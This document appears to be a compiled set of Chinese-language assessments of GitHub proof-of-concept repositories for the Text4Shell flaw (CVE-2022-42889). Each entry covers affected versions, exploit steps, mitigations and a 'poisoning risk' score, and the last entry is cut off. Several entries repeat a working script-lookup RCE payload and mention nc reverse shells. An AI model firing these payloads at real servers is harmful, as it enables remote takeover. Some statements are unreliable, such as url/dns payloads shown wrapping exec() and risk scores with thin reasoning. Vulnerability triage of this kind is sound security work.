**来源**: [CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md](../2022/CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9, >= 1.5

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户控制用于变量插值的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是一个存在于Apache Commons Text库中的远程代码执行漏洞。受影响的版本（1.5 到 1.9）中的默认插值器允许通过 `script`, `dns`, `url` 等前缀执行任意代码或与远程服务器建立连接。

**有效性：**

提供的POC代码是有效的，它展示了如何利用该漏洞。Dockerfile和pom.xml文件显示使用了易受攻击的Apache Commons Text 1.8版本。`README.md`文件提供了构建和运行POC应用程序的明确步骤，以及使用`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`有效负载触发RCE的示例。它尝试在/tmp/目录下创建一个文件来验证漏洞。

**投毒风险：**

该代码仓库中存在一些轻微的投毒风险的可能性。`whitesource.config`文件表明使用了 Whitesource，这是一种软件组合分析（SCA）工具。虽然这本身不是恶意行为，但可能表明作者试图隐藏某些依赖项或漏洞，或者他们正在使用自动化工具进行构建。代码结构较为简单，且RCE payload 明显，但仍需要对整个仓库进行细致的代码审计以完全确定是否还有其它隐藏的恶意代码，故判投毒比例为10%。

**利用方式：**

该漏洞的利用方式是通过构造包含恶意表达式的字符串，利用Apache Commons Text的字符串插值功能。攻击者可以将恶意表达式注入到应用程序使用的任何用户可控的输入中（例如，URL参数，POST数据等）。当应用程序使用`StringSubstitutor.createInterpolator()`并使用用户提供的输入执行插值时，恶意表达式将被执行。提供的POC使用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload在目标机器上执行任意命令。其他的利用方式可以使用`dns`或`url`前缀来尝试联系恶意服务器或执行其他操作。

**项目地址:** [ReachabilityOrg/cve-2022-42889-text4shell-docker](https://github.com/ReachabilityOrg/cve-2022-42889-text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #9

**来源**: [CVE-2022-42889-Sic4rio_CVE-2022-42889.md](../2022/CVE-2022-42889-Sic4rio_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的 Apache Commons Text 版本，且允许用户可控的输入传递给 Commons Text 的文本插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个远程代码执行漏洞。该漏洞源于库中的变量插值功能，允许攻击者通过构造恶意输入，利用`script`, `dns`, 和 `url` 等 StringLookup 实现执行任意代码或与远程服务器进行交互。 

**有效性：**

根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用是有效的。搜索结果中多个链接（例如：[webpage 1], [webpage 2], [webpage 4], [webpage 6], [webpage 9]）都表明此漏洞是远程代码执行漏洞，且危害严重。POC代码通过 `${script:javascript:java.lang.Runtime.getRuntime().exec(...) }` 构造恶意payload，利用 `script` StringLookup 执行系统命令，验证了漏洞的存在。

**投毒风险：**

提供的python POC代码主要功能是发送包含恶意payload的HTTP请求，payload会利用目标服务器上的java环境来执行命令。投毒代码分析如下：
*   代码的功能相对清晰，主要是构造payload发送请求，执行反弹shell。
*   风险点在于 `busybox nc` 命令，攻击者可能通过修改 IP 地址和端口来连接受害者的机器，但这是漏洞利用本身需要的，不能算是作者特意植入的后门。
*   虽然使用了`verify=False` 绕过了ssl证书校验，但这是为了方便测试自签名证书的情况，也属于正常情况。
*   代码中存在TerminalColors类，为输出添加颜色。这部分代码不会影响payload的执行，可以认为是正常的。

总体来看，代码本身并没有明显的恶意行为，但使用者需要注意，在未授权的情况下使用此脚本进行攻击属于非法行为。因此，投毒风险评估为5%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了存在漏洞的 Apache Commons Text 版本（1.5 到 1.9）。
2.  **构造Payload：**  构造包含恶意代码的字符串，利用`${prefix:name}` 格式进行变量插值。其中，`prefix` 可以是 `script`、`dns` 或 `url` 等，利用这些 StringLookup 实现执行命令或访问远程资源。
3.  **发送请求：**  将构造的恶意字符串作为输入，通过HTTP请求或其他方式发送给目标应用程序。该输入需要到达使用 Apache Commons Text 进行插值处理的地方。
4.  **执行代码：**  如果目标应用程序存在漏洞，Apache Commons Text 会解析恶意字符串，执行其中的代码。
5.  **反弹shell：**  POC中使用 `busybox nc` 命令反弹 shell，攻击者可以控制目标系统。

**项目地址:** [Sic4rio/CVE-2022-42889](https://github.com/Sic4rio/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #10

**来源**: [CVE-2022-42889-Syndicate27_text4shell-exploit.md](../2022/CVE-2022-42889-Syndicate27_text4shell-exploit.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的输入参与 `${}` 格式的字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个影响 Apache Commons Text 1.5 到 1.9 版本的远程代码执行漏洞。该漏洞源于库中不安全的默认插值器，允许攻击者利用 'script'、'dns' 和 'url' 等前缀执行恶意代码。 

**有效性:**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。PoC 代码展示了如何使用 `${script:javascript:java.lang.Runtime.getRuntime().exec(...)}` 构造恶意 payload，并通过 HTTP POST 请求发送到目标服务器，从而执行任意系统命令。

**投毒风险:**
分析 PoC 代码，未发现明显的投毒代码。该代码结构简单，主要功能是构造 payload 并发送 HTTP 请求。许可证和 README 文件也比较规范，没有可疑之处。因此，投毒风险评估为 0%。

**利用方式:**
1.  **确定目标应用:** 找到使用了存在漏洞的 Apache Commons Text 版本的 Java 应用程序，并且该应用允许用户控制的输入参与字符串插值。
2.  **构造 Payload:** 使用`${script:javascript:java.lang.Runtime.getRuntime().exec(...)}`或类似的方式构造恶意 payload，其中 `...` 部分包含要执行的系统命令，如反弹 shell 等。
3.  **URL 编码:** 对构造好的 payload 进行 URL 编码，以确保其能够正确地通过 HTTP 请求传输。
4.  **发送请求:**  将编码后的 payload 嵌入到 HTTP 请求的参数中（如 GET 请求的查询参数或 POST 请求的 body），发送到目标应用程序。
5.  **监听连接:**  如果 payload 是反弹 shell，需要在攻击者机器上监听相应的端口，等待目标机器连接。

**修复建议:**
升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用了有问题的插值器。如果无法升级，可以考虑禁用或限制应用程序中使用的插值器，或者对用户输入进行严格的验证和过滤。

**项目地址:** [Syndicate27/text4shell-exploit](https://github.com/Syndicate27/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #11

**来源**: [CVE-2022-42889-aaronm-sysdig_text4shell-docker.md](../2022/CVE-2022-42889-aaronm-sysdig_text4shell-docker.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用Apache Commons Text <= 1.9，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个高危漏洞。该漏洞源于程序在处理用户提供的字符串时，使用了不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，利用`script`、`dns`或`url`等lookup前缀，执行任意代码。 

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞是有效的。漏洞利用代码中的Dockerfile-vuln和README.md文件清晰地展示了如何构建一个包含漏洞的应用程序，并使用特定的payload触发远程代码执行，例如创建`/tmp/foo`文件。

**投毒风险：**

该仓库的投毒风险较低，约为5%。 虽然不能完全排除作者隐藏恶意代码的可能性，但是从以下几点可以分析出，投毒的概率较低:

*   提供的代码主要是漏洞的演示和利用，重点在于复现漏洞本身。
*   Dockerfiles主要用于环境搭建，没有发现可疑的恶意命令。
*   pom-patched.xml修复了漏洞，pom-vuln.xml 包含漏洞，本身是用来复现漏洞的。
*   README.md 详细描述了利用步骤和验证方式，方便用户理解和测试。
*   azure-pipelines.yml 使用Sysdig进行安全扫描，表明作者可能关注安全性问题。

**可能的投毒方式（仅为假设）**:

*   在`src`目录下的Java代码中加入后门。
*   修改`pom.xml`，引入恶意的依赖项。
*   在Dockerfile中添加执行恶意命令的指令。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9之间的版本。
2.  应用程序允许用户提供字符串，这些字符串将被用于变量插值。
3.  攻击者构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中 `command` 是攻击者想要执行的系统命令。
4.  应用程序解析并执行该字符串，导致远程代码执行。

**缓解措施：**

1.  升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了存在风险的interpolator。
2.  如果无法升级，禁用或限制应用程序中使用的lookup，移除`script`、`dns`和`url`等lookup的默认配置。
3.  对用户提供的输入进行严格的验证和过滤，防止恶意表达式的注入。

**项目地址:** [aaronm-sysdig/text4shell-docker](https://github.com/aaronm-sysdig/text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #12

**来源**: [CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md](../2022/CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5-1.9)

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户可控的输入传递给文本插值函数

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889（又名Text4Shell）是Apache Commons Text库中的一个漏洞，它允许攻击者通过变量插值执行任意代码。该漏洞存在于1.5到1.9版本中。漏洞利用方式是，攻击者可以向应用程序提供包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。当应用程序使用Commons Text处理此输入时，该表达式将被解析和执行，从而导致远程代码执行。

**有效性评估：**
提供的POC代码似乎有效，因为它演示了如何使用`script`前缀执行任意命令。 Dockerfile 和 README.md 文件描述了如何构建和运行一个易受攻击的应用程序，`exploit.php` 文件构造了利用此漏洞的有效载荷。从搜索结果来看，该漏洞是一个高危漏洞，已经被广泛研究和利用。

**投毒风险分析：**
该仓库中存在潜在的投毒风险，但概率较低。以下是一些需要考虑的因素：

*   `install.sh` 和 `stop-app.sh` 脚本包含一些危险的命令，例如 `sudo` 命令以及`docker kill $(sudo docker ps -q)`。虽然这是为了快速启动和停止 docker 环境，但是也可能会被恶意使用，例如，如果攻击者控制了这些脚本，他们可以利用 `sudo` 命令来执行恶意操作。
*   `exploit.php` 文件中的 `$ip = "172.17.0.1";` 可能是一个陷阱。如果攻击者直接使用这段代码，他们的反向shell可能无法连接，从而暴露出攻击者。

考虑到作者的意图是演示漏洞利用，而并非恶意攻击，将此代码判定为投毒代码的概率为10%。

**利用方式：**
1.  构建和运行易受攻击的应用程序。
2.  构造包含恶意表达式的输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
3.  将此输入传递给应用程序的文本插值函数。
4.  表达式将被解析和执行，从而导致远程代码执行。`exploit.sh`和`exploit.php` 文件提供了一种自动化的利用方式，利用`nc`进行反弹shell。

**项目地址:** [adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889](https://github.com/adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #13

**来源**: [CVE-2022-42889-chainguard-dev_text4shell-policy.md](../2022/CVE-2022-42889-chainguard-dev_text4shell-policy.md)

## CVE-2022-42889 Apache Commons Text Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text 且允许用户控制的输入传递给插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞，该漏洞允许攻击者通过变量插值执行任意代码。当应用程序使用受影响版本（1.5 到 1.9）的库，并且允许不可信的输入传递给执行插值的函数时，就存在风险。 

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且危害等级高，可以远程执行代码。提供的 Dockerfile 展示了如何使用包含漏洞的 commons-text-1.0.0-SNAPSHOT.jar 包构建镜像，并通过 java -jar 命令运行，这意味着该 POC 能够重现漏洞，证明其有效性。

**投毒风险分析：**

提供的代码包括一个 Dockerfile 和一个 LICENSE 文件。Dockerfile 用于构建一个包含易受攻击的Apache Commons Text库的Java应用程序镜像。LICENSE文件是标准的Apache 2.0许可协议，本身不包含恶意代码。由于Dockerfile只是部署了漏洞利用所需的易受攻击的jar包，并没有其他可疑操作，因此该仓库直接包含投毒代码的可能性较低，但存在一定的供应链风险，即如果依赖的jar包本身就被投毒，那么部署的应用也就会被投毒。综合判断，投毒的可能性评估为5%。

**利用方式：**

该漏洞的利用方式是构造包含恶意表达式的字符串，利用 Apache Commons Text 的字符串插值功能执行任意代码。具体步骤如下：

1.  确定应用程序中使用了 Apache Commons Text 库，并且版本在 1.5 到 1.9 之间。
2.  找到应用程序中允许用户控制的输入点，该输入会被传递给 Apache Commons Text 的字符串插值功能。
3.  构造包含恶意表达式的输入字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('evil command')}`。其中，`script` 前缀指示使用 javax.script 引擎执行代码。其他的利用方式还包括使用 `dns` 和 `url` 前缀。
4.  将构造的恶意字符串发送给应用程序。
5.  应用程序使用 Apache Commons Text 进行字符串插值时，会执行恶意表达式，从而导致远程代码执行。

**修复建议：**

升级到 Apache Commons Text 1.10.0 或更高版本。该版本默认禁用了有风险的插值器。

**项目地址:** [chainguard-dev/text4shell-policy](https://github.com/chainguard-dev/text4shell-policy)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #14

**来源**: [CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md](../2022/CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md)

## CVE-2022-42889-Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** 1.5 - 1.9

**利用条件:** 需要应用程序使用Apache Commons Text 1.5-1.9版本,并且允许从不受信任的源接收和处理字符串输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中存在不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，利用`${prefix:name}`格式进行插值，其中 `prefix` 指定了 `StringLookup` 的实例，而 `name` 包含了要执行的命令或表达式。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且影响Apache Commons Text 1.5到1.9版本。POC代码的`README.md`文件描述了漏洞原理和利用方式，`main.py`文件包含了利用漏洞的代码示例。利用脚本中使用了`script`、`url` 和 `dns` 等前缀，这些前缀在受影响的版本中默认启用，可导致任意代码执行。

**投毒风险：**
该POC代码主要目标是利用漏洞，但存在一定的投毒风险。风险评估在10%。主要原因分析如下：

*   **代码混淆/隐藏：** 虽然没有明显的混淆，但是代码的可读性不是非常高，存在一些压缩和简化写法，这可能用来隐藏恶意代码。
*   **恶意依赖：** 脚本中使用了`os`, `requests`, `colorama`, `base64`, `nmap`库。这些库本身没有问题，但存在被滥用的可能. 比如`os.system` 或 `subprocess.call` 执行恶意命令.
*   **Payload生成：** 脚本中定义了`payloads`字典，其中包含一些 RCE Payload。攻击者可能会修改这些payload执行恶意指令。
*   **网络行为：** 脚本使用`requests`库，可能用于下载恶意payload或者回传信息。`nmap` 也可能被滥用。
*   **powershellRevshell：** 脚本包含了一个powershell reverse shell 脚本，需要LHOST和LPORT，可能被用于植入后门。

**利用方式：**
利用方式如下：
1.  **漏洞定位：** 找到使用存在漏洞的 Apache Commons Text 库，且允许用户可控输入的地方。
2.  **构造Payload：** 构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('COMMAND')}`。将 'COMMAND' 替换为要执行的命令。
3.  **发送Payload：** 将构造的Payload发送到目标应用程序。
4.  **执行代码：** 如果应用程序使用存在漏洞的Commons Text库处理了Payload，那么恶意命令将被执行。

**总结：**
该漏洞利用的有效性较高，因为可以通过多种方式执行任意命令。虽然提供的POC主要是为了验证漏洞，但是如果被恶意修改，仍然存在投毒的可能。使用该POC时需要注意安全风险，并对其代码进行详细审查。

**项目地址:** [cryxnet/CVE-2022-42889-RCE](https://github.com/cryxnet/CVE-2022-42889-RCE)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #15

**来源**: [CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= 版本 <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户控制的输入传递给 StringSubstitutor.replace() 或 StringSubstitutor.replaceIn() 方法进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个存在于 Apache Commons Text 库中的高危漏洞。该漏洞源于库中 StringSubstitutor 类的变量插值功能。如果应用程序使用受影响版本（1.5 到 1.9）的 Apache Commons Text，并且允许用户控制的输入用于字符串插值，那么攻击者可以通过构造恶意输入来执行任意代码。

**利用方式：**

攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指定了用于查找 `StringLookup` 实例的前缀。漏洞存在于以下几个 lookup 中：

*   **script:** 允许使用 JVM 脚本执行引擎（javax.script）执行表达式。例如，在 JDK 15 之前，可以使用 Nashorn 引擎执行 JavaScript 代码，从而执行任意命令：`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`。在 JDK 15 及更高版本中，如果应用程序包含 JEXL 等第三方依赖，仍然可能通过类似方式执行代码。
*   **dns:** 允许解析 DNS 记录。虽然不能直接执行代码，但可以用于信息收集或发起拒绝服务攻击：`${dns:address|commons.apache.org}`。
*   **url:** 允许从指定的 URL 加载值，包括远程服务器。这可以用来读取敏感信息或通过 SSRF 发起攻击：`${url:UTF-8:https://nvd.nist.gov/vuln/detail/CVE-2022-42889}`。

**POC 分析：**

提供的 Dockerfile 和 README 文件提供了一个可用于测试和验证此漏洞的 POC 环境。Dockerfile 设置了所需的 Java 环境，并编译和运行包含漏洞的应用程序。README 提供了不同利用方式的示例，包括使用 `script`、`dns` 和 `url` lookup 的 payload。

**投毒风险分析：**

根据提供的文件内容，该仓库的主要目的是为了重现和演示 CVE-2022-42889 漏洞。评估投毒风险较低。Dockerfile虽然安装了一些如netcat，wget，curl等工具，可以辅助漏洞验证。但根据POC利用的常规方式，以及参考互联网上已公开的POC和EXP来看，这些工具都是常规操作。

**总结：**

CVE-2022-42889 是一个严重的安全漏洞，允许攻击者远程执行代码。应用程序应尽快升级到 Apache Commons Text 1.10.0 或更高版本，以禁用有问题的 interpolator，并仔细审查代码，确保用户提供的输入不会用于字符串插值。提供的 POC 代码对于理解和验证漏洞非常有用，但应谨慎使用，并采取适当的安全措施。

**项目地址:** [cxzero/CVE-2022-42889-text4shell](https://github.com/cxzero/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #16

**来源**: [CVE-2022-42889-devenes_text4shell-cve-2022-42889.md](../2022/CVE-2022-42889-devenes_text4shell-cve-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，且允许用户可控的输入传递给使用了不安全插值默认值的文本处理函数。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于Apache Commons Text 1.5到1.9版本中，由于默认启用的StringLookup实例存在安全问题，允许攻击者在应用程序处理用户提供的字符串时执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。漏洞利用代码（Dockerfile、README.md、pom.xml）提供了一个可运行的示例，展示了如何利用该漏洞执行任意命令。

**投毒风险：**

该POC代码的主要目的是演示CVE-2022-42889漏洞的利用。Dockerfile构建了一个包含漏洞的Java应用程序，README.md提供了运行和测试该应用程序的说明，pom.xml则定义了Maven项目的依赖和构建配置。尽管POC代码本身是为了演示漏洞，潜在的投毒风险极低（约1%）。

**利用方式：**

1.  **漏洞原理：** Apache Commons Text 存在变量插值功能，允许动态评估和扩展属性。受影响版本中，默认启用的 `script`、`dns` 和 `url` 等 StringLookup 实例允许执行任意代码、解析 DNS 记录或加载 URL。如果应用程序允许用户控制输入，则可能遭受远程代码执行攻击。
2.  **攻击步骤：**
    a.  部署包含漏洞的应用程序。
    b.  向应用程序发送包含恶意payload的请求。Payload利用 `${prefix:name}` 格式，其中 `prefix` 是 `script`、`dns` 或 `url`，`name` 包含要执行的恶意代码。
    c.  服务器处理请求，执行payload，导致远程代码执行。
3.  **示例payload：**
    `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`

此payload使用 `script` 前缀执行 JavaScript 代码，调用 `java.lang.Runtime.getRuntime().exec()` 执行 `touch /tmp/foo` 命令，在目标服务器上创建 `/tmp/foo` 文件。

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   禁用或限制应用程序中使用的不安全 StringLookup 实例。
*   对用户提供的输入进行严格的验证和清理，以防止恶意payload注入。

**项目地址:** [devenes/text4shell-cve-2022-42889](https://github.com/devenes/text4shell-cve-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #17

**来源**: [CVE-2022-42889-f0ng_text4shellburpscanner.md](../2022/CVE-2022-42889-f0ng_text4shellburpscanner.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户控制的输入传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889 (Text4Shell) 漏洞存在于 Apache Commons Text 1.5 到 1.9 版本。该漏洞源于库中不安全的插值默认设置，当应用程序使用这些默认设置且允许用户控制输入时，攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指示要使用的 `StringLookup` 实例。受影响的版本默认包含 `script`、`dns` 和 `url` 这几个 lookup，利用 `script` 可以执行任意 JVM 脚本，利用 `dns` 可以解析 DNS 记录，利用 `url` 可以从远程服务器加载值。攻击者可以构造恶意输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意命令。提供的漏洞利用代码是一个 Burp Suite 插件，用于检测是否存在此漏洞，它并没有直接执行恶意代码，只是辅助进行漏洞验证。从代码本身来看，没有明显的恶意行为，但考虑到Burp插件的功能强大，理论上作者可以暗中收集用户的使用数据或者篡改请求包，但这种可能性较低，约1%。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响版本的 Apache Commons Text。**
2.  **确定应用程序是否允许用户控制的输入传递给 `StringSubstitutor.replace()` 方法。**
3.  **构造包含恶意插值表达式的输入。** 例如,`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
4.  **将恶意输入发送到目标应用程序。**
5.  **如果应用程序存在漏洞，则恶意命令将在服务器上执行。**

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   如果无法升级，则可以禁用应用程序中的 `script`、`dns` 和 `url` 插值器。

**项目地址:** [f0ng/text4shellburpscanner](https://github.com/f0ng/text4shellburpscanner)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #18

**来源**: [CVE-2022-42889-gokul-ramesh_text4shell-exploit.md](../2022/CVE-2022-42889-gokul-ramesh_text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未授权的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text, 并且允许变量插值处理不受信任的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于库中不安全的变量插值默认设置。攻击者可以通过构造包含恶意表达式的输入，利用`${prefix:name}`格式进行插值，触发远程代码执行。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞利用是有效的，并且影响Apache Commons Text 1.5到1.9版本。提供的POC代码尝试利用`script`, `url` 和 `dns` 等 lookup 实现远程代码执行。

**投毒风险：**
*   POC代码本身的主要目的是为了验证漏洞的存在，利用interactsh来验证命令执行。投毒风险评估较低，约为10%。
*   投毒风险主要来自以下方面：虽然POC主要目的是进行漏洞验证，但如果使用者不小心，直接在生产环境运行，可能会造成破坏。此外，攻击者可能修改POC代码，添加恶意功能，例如植入后门，并传播修改后的POC。
*   代码中使用了 `ping` 命令进行验证，这本身没有危害，但恶意修改者可能替换成更危险的命令。

**利用方式：**
1.  **漏洞定位：** 确定目标应用程序使用了Apache Commons Text 1.5到1.9的受影响版本。
2.  **构造Payload：** 构造包含恶意表达式的输入字符串，利用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`, `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}` 或者 `${dns:address:java.lang.Runtime.getRuntime().exec('command')}` 这样的格式。
3.  **发送Payload：** 将构造的Payload作为输入发送到目标应用程序，例如通过HTTP请求的查询参数或User-Agent头。
4.  **执行代码：** 如果应用程序使用Commons Text对Payload进行变量插值，恶意代码将被执行。
5.  **验证：** 使用interactsh等工具验证代码是否成功执行。例如, 通过DNS请求或者ping命令。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   如果无法升级，可以配置`StringLookupFactory`以禁用`script`、`dns`和`url`查找。
*   对所有用户输入进行严格的验证和清理，避免将不受信任的数据传递给Commons Text进行处理。

**项目地址:** [gokul-ramesh/text4shell-exploit](https://github.com/gokul-ramesh/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #19

**来源**: [CVE-2022-42889-hotblac_text4shell.md](../2022/CVE-2022-42889-hotblac_text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序必须使用受影响版本的Apache Commons Text，并且允许用户控制的输入传递给StringSubstitutor进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个漏洞，允许攻击者通过操纵传递给 `StringSubstitutor` 的输入来执行任意代码。漏洞存在于1.5到1.9版本中。升级到1.10.0及以上版本可以解决此问题，因为该版本默认禁用了有问题的插值器，或者禁用受影响的lookup，例如`script`, `dns`, `url`。

**有效性：**
